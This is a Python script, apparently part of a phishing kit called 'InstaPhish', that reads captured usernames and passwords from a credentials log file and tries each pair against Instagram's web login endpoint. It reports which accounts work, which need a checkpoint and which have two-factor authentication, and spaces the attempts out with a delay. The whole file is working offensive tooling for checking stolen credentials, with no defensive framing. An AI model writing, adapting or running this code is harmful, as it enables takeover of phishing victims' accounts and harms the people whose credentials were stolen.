#!/usr/bin/env python3
"""
InstaPhish - Credential Validator
Author: r4tur1

Validates captured credentials against Instagram's API
to confirm working accounts.
"""

import requests
import json
import time
import os
import sys
from pathlib import Path
from urllib.parse import urlencode

class InstagramValidator:
    def __init__(self):
        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': '936619743392459',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/'
        })
    
    def get_csrf_token(self):
        """Get CSRF token from Instagram"""
        try:
            response = self.session.get('https://www.instagram.com/')
            if 'csrftoken' in self.session.cookies:
                return self.session.cookies['csrftoken']
            
            # Extract from response
            text = response.text
            import re
            match = re.search(r'"csrf_token":"([^"]+)"', text)
            if match:
                return match.group(1)
        except Exception as e:
            print(f'[!] CSRF fetch error: {e}')
        return None
    
    def check_credentials(self, username, password):
        """Check if credentials are valid"""
        csrf = self.get_csrf_token()
        if not csrf:
            return {'valid': False, 'error': 'Could not get CSRF token'}
        
        self.session.headers['X-CSRFToken'] = csrf
        
        timestamp = int(time.time())
        enc_password = f'#PWD_INSTAGRAM_BROWSER:10:{timestamp}:{password}'
        
        data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'true',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}'
        }
        
        try:
            response = self.session.post(
                self.api_url,
                data=data,
                allow_redirects=False,
                timeout=15
            )
            
            result = response.json()
            
            return {
                'valid': result.get('authenticated', False),
                'user_id': result.get('userId'),
                'checkpoint': bool(result.get('checkpoint_url')),
                'two_factor': result.get('two_factor_required', False),
                'message': result.get('message', '')
            }
            
        except requests.exceptions.RequestException as e:
            return {'valid': False, 'error': str(e)}
        except json.JSONDecodeError:
            return {'valid': False, 'error': 'Invalid response'}
    
    def validate_from_file(self, file_path):
        """Validate all credentials in log file"""
        if not os.path.exists(file_path):
            print(f'[!] File not found: {file_path}')
            return
        
        print('\n[ Instagram Credential Validator ]')
        print('─' * 50)
        
        with open(file_path, 'r') as f:
            content = f.read()
        
        # Parse credentials
        entries = []
        current = {}
        
        for line in content.split('\n'):
            line = line.strip()
            if line.startswith('USERNAME:'):
                current['username'] = line.replace('USERNAME:', '').strip()
            elif line.startswith('PASSWORD:'):
                current['password'] = line.replace('PASSWORD:', '').strip()
            elif line.startswith('==='):
                if 'username' in current and 'password' in current:
                    entries.append(current.copy())
                current = {}
        
        # Validate each entry
        valid_count = 0
        total = len(entries)
        
        for i, entry in enumerate(entries, 1):
            print(f'\n[{i}/{total}] Checking: {entry["username"]}')
            
            result = self.check_credentials(entry['username'], entry['password'])
            
            if result.get('valid'):
                valid_count += 1
                print(f'  ✅ VALID - User ID: {result.get("user_id", "N/A")}')
            elif result.get('checkpoint'):
                print(f'  ⚠️  CHECKPOINT - Account requires verification')
            elif result.get('two_factor'):
                print(f'  🔐 2FA ENABLED - Password correct but 2FA required')
            else:
                print(f'  ❌ INVALID - {result.get("message", result.get("error", "Unknown"))}')
            
            # Delay between checks
            if i < total:
                time.sleep(2)
        
        print(f'\n─' * 50)
        print(f'Results: {valid_count}/{total} valid accounts')
    
    def quick_check(self, username, password):
        """Quick single credential check"""
        print(f'\n[ Checking: {username} ]')
        result = self.check_credentials(username, password)
        
        if result.get('valid'):
            print(f'✅ VALID - Working account!')
        elif result.get('checkpoint'):
            print(f'⚠️  CHECKPOINT REQUIRED')
        elif result.get('two_factor'):
            print(f'🔐 2FA ENABLED')
        else:
            print(f'❌ INVALID - {result.get("message", "Unknown error")}')
        
        return result

if __name__ == '__main__':
    validator = InstagramValidator()
    
    if len(sys.argv) > 2:
        # Quick check mode
        validator.quick_check(sys.argv[1], sys.argv[2])
    else:
        # File mode
        log_file = Path(__file__).parent.parent / 'logs' / 'credentials.txt'
        if len(sys.argv) > 1:
            log_file = sys.argv[1]
        
        print(f'[+] Loading credentials from: {log_file}')
        validator.validate_from_file(log_file)